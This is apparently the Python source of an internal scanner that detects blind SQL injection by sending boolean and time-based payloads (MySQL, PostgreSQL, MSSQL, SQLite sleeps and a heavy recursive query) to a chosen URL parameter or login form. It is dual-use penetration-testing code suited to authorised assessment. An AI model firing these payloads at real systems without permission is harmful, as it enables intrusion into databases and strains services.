#!/usr/bin/env python3
"""
blind_sqli.py — Boolean- and time-based blind SQL injection detector (INTERNAL).

The existing input tools only catch error/reflection SQLi. Real databases mostly
fail silently, so real attackers go blind:
  * Boolean-based: inject a condition that's TRUE vs one that's FALSE and diff the
    responses. If TRUE looks like the original and FALSE differs, the condition
    reached the query — injection confirmed without any error message.
  * Time-based: inject a DB-specific sleep. If the response stalls by the sleep
    duration, the payload executed — confirmed even when the response never
    changes.

    python TOOLS/blind_sqli.py --url "http://127.0.0.1:8901/search?q=test" --param q
    python TOOLS/blind_sqli.py --url http://host/login --param username --method POST
"""
import argparse
import difflib
import os
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vibe_core import VibeTool, FRAMEWORK_VERSION
from privacy_guard import privacy_user_agent

# (label, TRUE-condition, FALSE-condition) — {v} is the original param value.
BOOLEAN = [
    ("string-quote", "{v}' AND '1'='1", "{v}' AND '1'='2"),
    ("string-comment", "{v}' AND '1'='1'-- -", "{v}' AND '1'='2'-- -"),
    ("numeric", "{v} AND 1=1", "{v} AND 1=2"),
    ("numeric-comment", "{v} AND 1=1-- -", "{v} AND 1=2-- -"),
    ("paren-quote", "{v}') AND ('1'='1", "{v}') AND ('1'='2"),
    ("double-quote", '{v}" AND "1"="1', '{v}" AND "1"="2'),
]

# (dialect, sleep-payload) — DELAY seconds substituted for {s}.
DELAY = 4
TIME_PAYLOADS = [
    ("mysql", "{v}' AND SLEEP({s})-- -"),
    ("mysql-num", "{v} AND SLEEP({s})-- -"),
    ("postgres", "{v}' AND pg_sleep({s})-- -"),
    ("postgres-num", "{v}; SELECT pg_sleep({s})-- -"),
    ("mssql", "{v}'; WAITFOR DELAY '0:0:{s}'-- -"),
    ("sqlite-heavy", "{v}' AND 1=(WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<8000000) SELECT count(*) FROM c)-- -"),
    ("generic-or-sleep", "{v}' OR SLEEP({s})-- -"),
]


class BlindSQLi(VibeTool):
    def __init__(self):
        super().__init__("Blind SQLi", "Boolean/Time-Based Blind SQL Injection Detector")
        self.findings = 0

    def _send(self, url, param, value, method, extra):
        headers = {"User-Agent": privacy_user_agent("Blind SQLi"),
                   "Accept": "text/html,application/json,*/*"}
        parsed = urllib.parse.urlparse(url)
        q = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
        data = dict(extra)
        if method == "GET":
            q[param] = value
            new = parsed._replace(query=urllib.parse.urlencode(q))
            full, body = urllib.parse.urlunparse(new), None
        else:
            data[param] = value
            full = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(q)))
            body = urllib.parse.urlencode(data).encode()
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        start = time.perf_counter()
        try:
            req = urllib.request.Request(full, data=body, method=method, headers=headers)
            with urllib.request.urlopen(req, timeout=DELAY + 8) as r:
                text = r.read(60000).decode("utf-8", "replace")
                return r.getcode(), text, time.perf_counter() - start
        except urllib.error.HTTPError as e:
            return e.code, e.read(60000).decode("utf-8", "replace"), time.perf_counter() - start
        except Exception as e:
            return 0, str(e), time.perf_counter() - start

    @staticmethod
    def _ratio(a, b):
        return difflib.SequenceMatcher(None, a, b).ratio()

    def run(self, url, param, value, method, extra):
        self.banner()
        self.log(f"Target: {url}  param={param!r}  method={method}")

        b_st, b_body, b_lat = self._send(url, param, value, method, extra)
        if b_st == 0:
            self.log(f"Baseline request failed: {b_body}", "fail")
            return 2
        self.log(f"Baseline: status={b_st} len={len(b_body)} latency={b_lat*1000:.0f}ms")

        # --- Boolean-based ---------------------------------------------------
        self.log("=== BOOLEAN-BASED ===")
        for label, tpl_t, tpl_f in BOOLEAN:
            t_st, t_body, _ = self._send(url, param, tpl_t.format(v=value), method, extra)
            f_st, f_body, _ = self._send(url, param, tpl_f.format(v=value), method, extra)
            r_bt = self._ratio(b_body, t_body)     # TRUE should resemble baseline
            r_tf = self._ratio(t_body, f_body)     # TRUE vs FALSE should differ
            if t_st == b_st and r_bt >= 0.90 and r_tf < 0.90:
                self.log(f"BLIND SQLi (boolean) CONFIRMED via {label}: "
                         f"TRUE~baseline (sim {r_bt:.2f}), TRUE!=FALSE (sim {r_tf:.2f})", "hack")
                self.findings += 1
            else:
                self.log(f"{label}: no boolean differential (TRUE~base {r_bt:.2f}, TRUE~FALSE {r_tf:.2f})", "pass")

        # --- Time-based ------------------------------------------------------
        self.log("=== TIME-BASED ===")
        # Re-measure baseline latency (median of 2) to compare against.
        base_lat = min(self._send(url, param, value, method, extra)[2] for _ in range(2))
        for dialect, tpl in TIME_PAYLOADS:
            payload = tpl.format(v=value, s=DELAY)
            st, _, lat = self._send(url, param, payload, method, extra)
            delta = lat - base_lat
            if lat >= base_lat + DELAY * 0.7:
                self.log(f"BLIND SQLi (time) CONFIRMED via {dialect}: response stalled "
                         f"{delta:.1f}s (baseline {base_lat*1000:.0f}ms)", "hack")
                self.findings += 1
            else:
                self.log(f"{dialect}: no delay (+{delta*1000:.0f}ms)", "pass")

        self.log("=" * 40)
        if self.findings:
            self.log(f"BLIND SQLi COMPLETE — {self.findings} confirmed injection channel(s)", "hack")
        else:
            self.log("No blind SQL injection detected — parameter looks safely handled.", "pass")
        return 0


def main(argv=None):
    p = argparse.ArgumentParser(description="Blind SQLi - boolean/time-based blind SQL injection detector")
    p.add_argument("--url", required=True, help="Target URL (include the query for GET, e.g. ...?q=test)")
    p.add_argument("--param", required=True, help="Parameter to inject into")
    p.add_argument("--value", default="", help="Base value for the parameter (default: current/‘1’)")
    p.add_argument("--method", choices=("GET", "POST"), default="GET")
    p.add_argument("--data", default="", help="Extra fixed POST fields, e.g. 'password=x&csrf=y'")
    p.add_argument("-v", "--version", action="version", version=f"Blind SQLi {FRAMEWORK_VERSION}")
    args = p.parse_args(argv)

    value = args.value
    if not value:
        q = dict(urllib.parse.parse_qsl(urllib.parse.urlparse(args.url).query))
        value = q.get(args.param, "1")
    extra = dict(urllib.parse.parse_qsl(args.data)) if args.data else {}
    return BlindSQLi().run(args.url, args.param, value, args.method, extra)


if __name__ == "__main__":
    sys.exit(main())
